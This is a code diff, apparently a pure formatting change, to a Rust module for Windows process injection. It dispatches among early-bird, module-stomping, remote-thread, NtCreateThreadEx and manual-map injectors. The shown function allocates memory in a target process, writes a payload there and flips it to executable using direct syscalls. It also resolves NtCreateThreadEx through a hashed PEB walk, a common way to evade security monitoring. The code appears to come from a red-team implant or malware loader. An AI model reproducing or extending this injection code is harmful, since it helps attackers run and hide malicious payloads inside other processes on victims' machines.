@@ -7,9 +7,9 @@ pub mod early_bird;
 #[cfg(windows)]
 pub mod module_stomp;
 #[cfg(windows)]
-pub mod remote_thread;
-#[cfg(windows)]
 pub mod nt_create_thread;
+#[cfg(windows)]
+pub mod remote_thread;
 
 #[cfg(windows)]
 #[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
@@ -105,9 +105,12 @@ pub(crate) fn nt_create_thread_inject(
         let mut alloc_size = payload.len();
         let s = crate::syscall!(
             "NtAllocateVirtualMemory",
-            h_proc as u64, &mut remote_mem as *mut _ as u64,
-            0u64, &mut alloc_size as *mut _ as u64,
-            (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
+            h_proc as u64,
+            &mut remote_mem as *mut _ as u64,
+            0u64,
+            &mut alloc_size as *mut _ as u64,
+            (MEM_COMMIT | MEM_RESERVE) as u64,
+            PAGE_READWRITE as u64,
         );
         match s {
             Ok(st) if st >= 0 => {}
@@ -121,8 +124,10 @@ pub(crate) fn nt_create_thread_inject(
         let mut written = 0usize;
         let s = crate::syscall!(
             "NtWriteVirtualMemory",
-            h_proc as u64, remote_mem as u64,
-            payload.as_ptr() as u64, payload.len() as u64,
+            h_proc as u64,
+            remote_mem as u64,
+            payload.as_ptr() as u64,
+            payload.len() as u64,
             &mut written as *mut _ as u64,
         );
         match s {
@@ -144,9 +149,11 @@ pub(crate) fn nt_create_thread_inject(
         let mut prot_size = payload.len();
         let s = crate::syscall!(
             "NtProtectVirtualMemory",
-            h_proc as u64, &mut prot_base as *mut _ as u64,
+            h_proc as u64,
+            &mut prot_base as *mut _ as u64,
             &mut prot_size as *mut _ as u64,
-            PAGE_EXECUTE_READ as u64, &mut old_prot as *mut _ as u64,
+            PAGE_EXECUTE_READ as u64,
+            &mut old_prot as *mut _ as u64,
         );
         match s {
             Ok(st) if st >= 0 => {}
@@ -157,8 +164,11 @@ pub(crate) fn nt_create_thread_inject(
         // correctness on ARM64 and defense-in-depth on x86_64.
         crate::syscall!(
             "NtFlushInstructionCache",
-            h_proc as u64, remote_mem as u64, payload.len() as u64,
-        ).ok();
+            h_proc as u64,
+            remote_mem as u64,
+            payload.len() as u64,
+        )
+        .ok();
 
         // Resolve NtCreateThreadEx via PEB walk.
         let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
@@ -216,12 +226,8 @@ pub(crate) fn payload_has_valid_pe_headers(payload: &[u8]) -> bool {
         return false;
     }
 
-    let e_lfanew = u32::from_le_bytes([
-        payload[0x3c],
-        payload[0x3d],
-        payload[0x3e],
-        payload[0x3f],
-    ]) as usize;
+    let e_lfanew =
+        u32::from_le_bytes([payload[0x3c], payload[0x3d], payload[0x3e], payload[0x3f]]) as usize;
 
     if (e_lfanew & 0x3) != 0 {
         return false;
@@ -242,7 +248,9 @@ pub(crate) fn payload_has_valid_pe_headers(payload: &[u8]) -> bool {
 #[cfg(windows)]
 pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> anyhow::Result<()> {
     match method {
-        InjectionMethod::NtCreateThread => nt_create_thread::NtCreateThreadInjector.inject(pid, payload),
+        InjectionMethod::NtCreateThread => {
+            nt_create_thread::NtCreateThreadInjector.inject(pid, payload)
+        }
         InjectionMethod::ModuleStomp => module_stomp::ModuleStompInjector.inject(pid, payload),
         InjectionMethod::RemoteThread => remote_thread::RemoteThreadInjector.inject(pid, payload),
         InjectionMethod::EarlyBird => early_bird::EarlyBirdInjector.inject(pid, payload),
@@ -307,8 +315,7 @@ fn manual_map_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
             }
         }
         let _guard = HandleGuard(process);
-        module_loader::manual_map::load_dll_in_remote_process(process, payload)
-            .map(|_| ())
+        module_loader::manual_map::load_dll_in_remote_process(process, payload).map(|_| ())
     }
 }
 
